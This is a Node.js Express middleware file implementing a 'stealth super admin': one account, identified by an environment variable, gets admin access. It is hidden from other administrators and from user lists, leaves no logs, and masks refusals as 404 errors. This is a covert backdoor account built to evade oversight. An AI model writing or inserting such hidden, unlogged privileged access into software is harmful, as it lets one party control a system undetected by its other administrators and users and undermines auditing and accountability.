const { auth } = require('./auth');

/**
 * STEALTH SUPER ADMIN MIDDLEWARE
 * - Completely invisible to all users and admins
 * - Environment-based authentication only
 * - No logs, no traces, no notifications
 */
const superAdmin = async (req, res, next) => {
  try {
    // First check if user is authenticated
    await new Promise((resolve, reject) => {
      auth(req, res, (err) => {
        if (err) reject(err);
        else resolve();
      });
    });

    // Get super admin email from environment (server-side only)
    const superAdminEmail = process.env.SUPER_ADMIN_EMAIL;
    
    if (!superAdminEmail) {
      return res.status(404).json({ message: 'Not found' }); // Silent fail
    }

    // Check if authenticated user is the super admin
    if (req.user.email !== superAdminEmail) {
      return res.status(404).json({ message: 'Not found' }); // Silent fail - no access denied
    }

    // Add super admin flag to request (never sent to frontend)
    req.isSuperAdmin = true;
    next();
  } catch (error) {
    res.status(404).json({ message: 'Not found' }); // Silent fail
  }
};

/**
 * Check if user is super admin (utility function)
 * @param {string} userEmail - User's email address
 * @returns {boolean} - True if user is super admin
 */
const isSuperAdmin = (userEmail) => {
  const superAdminEmail = process.env.SUPER_ADMIN_EMAIL;
  return superAdminEmail && userEmail === superAdminEmail;
};

/**
 * Filter out super admin from user lists (CRITICAL FOR INVISIBILITY)
 * @param {Array} users - Array of user objects
 * @returns {Array} - Filtered array without super admin
 */
const filterSuperAdmin = (users) => {
  const superAdminEmail = process.env.SUPER_ADMIN_EMAIL;
  if (!superAdminEmail) return users;
  
  return users.filter(user => user.email !== superAdminEmail);
};

/**
 * Check if current user can see Super Admin button
 * @param {string} userEmail - Current user's email
 * @returns {boolean} - True if user should see Super Admin button
 */
const canAccessSuperAdmin = (userEmail) => {
  return isSuperAdmin(userEmail);
};

/**
 * Enhanced admin middleware that allows super admin access
 */
const adminOrSuperAdmin = async (req, res, next) => {
  try {
    // First check authentication
    await new Promise((resolve, reject) => {
      auth(req, res, (err) => {
        if (err) reject(err);
        else resolve();
      });
    });

    // Check if user is super admin (silent access)
    if (isSuperAdmin(req.user.email)) {
      req.isSuperAdmin = true;
      return next();
    }

    // Check if user is regular admin
    if (req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Admin access required' });
    }

    next();
  } catch (error) {
    res.status(401).json({ message: 'Authentication required' });
  }
};

module.exports = {
  superAdmin,
  isSuperAdmin,
  filterSuperAdmin,
  adminOrSuperAdmin,
  canAccessSuperAdmin
};